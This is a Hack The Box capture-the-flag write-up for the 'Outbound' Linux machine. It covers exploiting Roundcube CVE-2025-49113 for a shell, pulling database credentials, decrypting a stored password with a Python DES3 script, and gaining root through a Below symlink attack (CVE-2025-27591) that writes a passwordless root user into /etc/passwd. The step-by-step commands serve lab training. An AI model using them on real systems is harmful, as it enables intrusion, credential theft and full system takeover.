# HTB - Outbound

<img width="1400" height="705" alt="image" src="https://github.com/user-attachments/assets/ba8e8c36-4886-4f93-974e-96e16afea76d" />


## Machine Information
- **Target IP**: 10.10.11.77
- **Operating System**: Linux
- **Difficulty**: Medium

## Executive Summary

This writeup documents the complete penetration testing process of an HTB machine featuring a vulnerable Roundcube webmail application. The attack path involved exploiting a deserialization vulnerability (CVE-2025-49113) to gain initial access, extracting database credentials, decrypting stored passwords, and ultimately achieving privilege escalation through a symlink attack vulnerability (CVE-2025-27591) in the Below monitoring system.

## Reconnaissance

### Port Scanning

Initial reconnaissance was performed using Nmap to identify open ports and services running on the target machine.

```bash
nmap -sS -p- -Pn -n --open --min-rate 5000 -oG ./nmap/allports 10.10.11.77
```

![Nmap All Ports Scan](images/Pasted%20image%2020250729215703.png)

The scan revealed two open ports:
- Port 22 (SSH)
- Port 80 (HTTP)

### Service Enumeration

A detailed service scan was conducted to identify specific versions and configurations:

```bash
nmap -sCV -p22,80 -Pn -n -oN ../nmap/vulnscan 10.10.11.77
```

![Nmap Service Scan](images/Pasted%20image%2020250729215819.png)

**Results:**
- **SSH (Port 22)**: OpenSSH service running
- **HTTP (Port 80)**: Web server hosting Roundcube webmail application

## Web Application Analysis

### Initial Discovery

Upon accessing the web application at `http://10.10.11.77`, a Roundcube webmail login interface was discovered. Version detection revealed the application was running a vulnerable version of Roundcube.

![Roundcube Vulnerable Version](images/Pasted%20image%2020250729220016.png)

### Vulnerability Identification

The target was identified as running Roundcube Webmail version 1.6.10, which is vulnerable to CVE-2025-49113, a deserialization vulnerability that allows authenticated attackers to execute arbitrary code.

## Initial Access

### Exploit Research

Research into CVE-2025-49113 led to the discovery of a public exploit available on GitHub:
- **Repository**: https://github.com/hakaioffsec/CVE-2025-49113-exploit.git
- **Vulnerability**: Deserialization vulnerability in Roundcube Webmail versions 1.5.0 through 1.6.10

### Exploitation

The exploit was executed using the following command structure:

```bash
php CVE-2025-49113.php <url> <username> <password> <command>
```

This successful exploitation resulted in a reverse shell connection as the `www-data` user.

## Privilege Escalation - Phase 1

### Database Credential Discovery

While exploring the file system as `www-data`, the Roundcube configuration file was discovered:

**File Location**: `/var/www/html/config/config.inc.php`

**Database Credentials Found**:
```php
$rcmail_config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

![Database Configuration File](images/Pasted%20image%2020250729220447.png)

### Database Access

Using the discovered credentials, access was gained to the MariaDB database:

```bash
mysql -u roundcube -p'RCDBPass2025' roundcube
```

![Database Access](images/Pasted%20image%2020250728223752.png)

### Data Extraction

Database enumeration revealed critical information in the following tables:

**Users Table**: Contains user account information

![Database Tables](images/Pasted%20image%2020250728223813.png)

![Users Table Content](images/Pasted%20image%2020250728223833.png)

**Session Table**: Contains encrypted session data including stored passwords

### Password Decryption

From the session table, an encrypted password for user "jacob" was extracted:
- **Username**: jacob
- **Encrypted Password**: L7Rv00A8TuwJAr67kITxxcSgnIk25Am/

The encryption key was found in the configuration:
```php
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

### Decryption Script

A Python script was developed to decrypt the Roundcube password using the DES3 algorithm:

```python
#!/usr/bin/env python3
from base64 import b64decode
from Cryptodome.Cipher import DES3

def decrypt_roundcube_password(encrypted_password):
    des_key = b'rcmail-!24ByteDESkey*Str'
    
    try:
        # Decode base64
        data = b64decode(encrypted_password + '==')
        
        # Extract IV and ciphertext
        iv = data[:8]
        ciphertext = data[8:]
        
        # Handle padding
        if len(ciphertext) % 8 != 0:
            padding_needed = 8 - (len(ciphertext) % 8)
            ciphertext += b'\x00' * padding_needed
        
        # Create DES3 cipher
        cipher = DES3.new(des_key, DES3.MODE_CBC, iv)
        
        # Decrypt
        decrypted = cipher.decrypt(ciphertext)
        
        # Clean padding
        cleaned = decrypted.rstrip(b"\x00").rstrip(b"\x08")
        
        # Decode to text
        password = cleaned.decode('utf-8', errors='ignore')
        
        return password
        
    except Exception as e:
        print(f"Error: {e}")
        return None

# Decrypt the password
encrypted_pass = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
result = decrypt_roundcube_password(encrypted_pass)
```

**Decrypted Password**: 595mO8DmwGeD

![Password Decryption](images/Pasted%20image%2020250729210307.png)

### Email Access

Using the decrypted credentials, access was gained to Jacob's webmail account. Analysis of the inbox revealed two important messages, one containing SSH credentials.

![Jacob's Email Access](images/Pasted%20image%2020250729210506.png)

![Important Email Message](images/Pasted%20image%2020250729210615.png)

**SSH Credentials Discovered**:
- **Username**: jacob
- **Password**: gY4Wr3a1evp4

### SSH Access

Successful SSH connection was established using the discovered credentials:

```bash
ssh jacob@10.10.11.77
```

![SSH Connection](images/Pasted%20image%2020250729210739.png)

![User Access Confirmed](images/Pasted%20image%2020250729215434.png)

## Privilege Escalation - Phase 2

### System Enumeration

Upon gaining user-level access, system enumeration revealed the presence of the "Below" monitoring system binary with sudo privileges.

### Binary Analysis

The Below binary was identified with the following characteristics:
- **Location**: `/usr/bin/below`
- **Permissions**: Executable with sudo privileges
- **Version**: 0.8.0 (discovered using `sudo /usr/bin/below live`)

![](images/Pasted%20image%2020250729211106.png)

### Vulnerability Research

Research into Below version 0.8.0 revealed the presence of CVE-2025-27591, a privilege escalation vulnerability that allows unprivileged users to escalate to root through symlink attacks.

### Root Privilege Escalation

The privilege escalation was achieved through the following steps:

1. **Create a malicious user entry**:
```bash
echo 'spy::0:0:spy:/root:/bin/bash' > /tmp/spyuser
```

2. **Remove the existing error log**:
```bash
rm -f /var/log/below/error_root.log
```

3. **Create a symlink to /etc/passwd**:
```bash
ln -s /etc/passwd /var/log/below/error_root.log
```

4. **Trigger the Below binary to create a snapshot**:
```bash
sudo /usr/bin/below snapshot --begin now
```

5. **Overwrite the log file with malicious user data**:
```bash
cp /tmp/spyuser /var/log/below/error_root.log
```

6. **Switch to the new root user**:
```bash
su spy
```

![](Pasted%20image%2020250729215114.png)

### Root Access Achieved

This exploitation technique successfully granted root access to the system, completing the privilege escalation chain.

![](Pasted%20image%2020250729215239.png)

## Post-Exploitation

With root access obtained, full control of the target system was achieved. The attack path demonstrated a complete compromise from initial web application exploitation to full system administrative privileges.

## Remediation Recommendations

1. **Update Roundcube**: Upgrade to the latest patched version to address CVE-2025-49113
2. **Update Below**: Upgrade the Below monitoring system to address CVE-2025-27591
3. **Access Controls**: Implement proper file permissions and access controls
4. **Password Management**: Use strong, unique passwords and consider implementing multi-factor authentication
5. **Security Monitoring**: Implement comprehensive logging and monitoring solutions
6. **Regular Security Assessments**: Conduct periodic vulnerability assessments and penetration tests

## Conclusion

This penetration test successfully demonstrated a complete compromise of the target system through a chain of vulnerabilities. The attack path highlighted the importance of keeping software up-to-date and implementing defense-in-depth security strategies. The combination of application-level vulnerabilities and system-level privilege escalation techniques resulted in full administrative access to the target machine.
